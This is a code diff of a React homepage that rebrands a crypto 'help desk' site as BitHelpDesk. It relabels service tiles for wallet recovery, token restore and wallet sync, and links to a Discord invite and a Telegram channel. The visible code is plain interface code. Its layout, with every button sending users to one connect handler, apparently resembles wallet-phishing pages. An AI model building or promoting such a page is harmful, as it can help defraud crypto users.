@@ -5,7 +5,6 @@ import airdropIcon1 from "../assets/modal/airdrop.png";
 import airdropIcon2 from "../assets/modal/valid.png";
 import airdropIcon3 from "../assets/modal/purchase.jpeg";
 import airdropIcon4 from "../assets/modal/Fix gas.png";
-import airdropIcon5 from "../assets/modal/mint.jpeg";
 import airdropIcon6 from "../assets/modal/kyc.png";
 import airdropIcon7 from "../assets/modal/recover.png";
 import airdropIcon8 from "../assets/modal/migrate.png";
@@ -15,16 +14,16 @@ import discordLogo from "../assets/discord.png";
 import telegramLogo from "../assets/tele.png";
 
 const features = [
-  { name: "Airdrop Management", description: "Manage your crypto airdrops efficiently.", icon: airdropIcon1 },
-  { name: "Token Validation", description: "Verify and validate your token transactions.", icon: airdropIcon2 },
-  { name: "Crypto Purchases", description: "Buy cryptocurrencies seamlessly.", icon: airdropIcon3 },
-  { name: "Gas Fee Fixes", description: "Optimize and minimize gas fees.", icon: airdropIcon4 },
-  { name: "NFT Minting", description: "Create and mint your unique NFTs.", icon: airdropIcon5 },
-  { name: "KYC Verification", description: "Secure and compliant user verification.", icon: airdropIcon6 },
-  { name: "Wallet Recovery", description: "Recover lost or inaccessible wallets.", icon: airdropIcon7 },
-  { name: "Token Migration", description: "Easily migrate your tokens.", icon: airdropIcon8 },
-  { name: "Presale Participation", description: "Join exclusive crypto presales.", icon: airdropIcon9 },
-  { name: "Staking Rewards", description: "Earn rewards through staking.", icon: airdropIcon10 },
+  { name: "Airdrop Management", description: "Manage your crypto airdrops efficiently.", icon: airdropIcon1, buttonName: "Manage Airdrops" },
+  { name: "Token Validation", description: "Verify and validate your token transactions.", icon: airdropIcon2, buttonName: "Validate Tokens" },
+  { name: "Crypto Purchases", description: "Buy cryptocurrencies seamlessly.", icon: airdropIcon3, buttonName: "Buy Crypto" },
+  { name: "Gas Fee Fixes", description: "Optimize and minimize gas fees.", icon: airdropIcon4, buttonName: "Fix Gas Fees" },
+  { name: "Restore", description: "Restore lost Tokens", icon: airdropIcon7, buttonName: "Restore" },
+  { name: "KYC Verification", description: "Secure and compliant user verification.", icon: airdropIcon6, buttonName: "Verify KYC" },
+  { name: "Recovery", description: "Recover lost or inaccessible wallets.", icon: airdropIcon7, buttonName: "Recover Wallet" },
+  { name: "Token Migration", description: "Easily migrate your tokens.", icon: airdropIcon8, buttonName: "Migrate Tokens" },
+  { name: "Presale Participation", description: "Join exclusive crypto presales.", icon: airdropIcon9, buttonName: "Join Presales" },
+  { name: "Synchronization", description: "Sync wallets securely while ensuring user data protection", icon: airdropIcon10, buttonName: "Sync" },
 ];
 
 const HomePage = () => {
@@ -82,7 +81,7 @@ const HomePage = () => {
   return (
     <div className="homepage">
       <nav className="navbar">
-        <div className="navbar-logo">Nodeactivator</div>
+        <div className="navbar-logo">BitHelpDesk</div>
         <button className="connect-button" onClick={handleButtonClick}>
           Connect
         </button>
@@ -120,34 +119,33 @@ const HomePage = () => {
       </div>
 
       <div className="modules">
-        <div className="modules-grid">
-          {features.map((feature, index) => (
-            <div className="module-item" key={index}>
-              <img
-                src={feature.icon}
-                alt={feature.name}
-                className="module-icon"
-              />
-              <h3>{feature.name}</h3>
-              <p>{feature.description}</p>
-              <button
-                className="module-button"
-                onClick={handleButtonClick}
-              >
-                {feature.name}
-              </button>
-            </div>
-          ))}
-        </div>
+  <div className="modules-grid">
+    {features.map((feature, index) => (
+      <div className="module-item" key={index}>
+        <img
+          src={feature.icon}
+          alt={feature.name}
+          className="module-icon"
+        />
+        <h3>{feature.name}</h3>
+        <p>{feature.description}</p>
+        <button
+          className="module-button"
+          onClick={handleButtonClick}
+        >
+          {feature.buttonName}
+        </button>
       </div>
-
+    ))}
+  </div>
+</div>
       {/* Footer with Discord and Telegram links */}
       <div className="footer">
         <div className="social-links">
-          <a href="https://discord.com" target="_blank" rel="noopener noreferrer">
+          <a href="https://discord.gg/fhX2NwGT" target="_blank" rel="noopener noreferrer">
             <img src={discordLogo} alt="Discord" className="social-icon" />
           </a>
-          <a href="https://t.me" target="_blank" rel="noopener noreferrer">
+          <a href="https://t.me/BitHelpDeskhub" target="_blank" rel="noopener noreferrer">
             <img src={telegramLogo} alt="Telegram" className="social-icon" />
           </a>
         </div>
